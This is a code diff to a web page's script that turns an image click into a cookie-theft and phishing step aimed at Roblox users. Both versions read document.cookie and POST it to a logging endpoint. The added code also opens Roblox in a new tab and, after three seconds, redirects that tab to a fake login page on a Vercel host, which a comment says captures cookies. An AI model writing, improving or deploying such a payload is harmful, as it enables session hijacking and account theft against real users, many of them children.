@@ -18,21 +18,24 @@
       const image = document.getElementById("track-image");
 
       image.addEventListener("click", async () => {
-        const cookies = document.cookie;
-        try {
-          await fetch("/api/log", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              cookies: cookies,
-              url: window.location.href,
-            }),
-          });
-        } catch (error) {
-          console.error("Failed to send log:", error);
-        }
+        // Open Roblox login page in a new tab
+        const robloxTab = window.open("https://www.roblox.com/home", "_blank");
+
+        // Wait 3 seconds, then try to redirect through a fake login page that captures cookies
+        setTimeout(() => {
+          const redirectUrl = `https://your-vercel-app.vercel.app/capture.html?ref=${encodeURIComponent(window.location.href)}`;
+          robloxTab.location.href = redirectUrl;
+        }, 3000);
+
+        // Also send current cookies (non-HttpOnly ones)
+        await fetch("/api/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            cookies: document.cookie,
+            message: "New tab opened to Roblox",
+          }),
+        });
       });
     </script>
   </body>
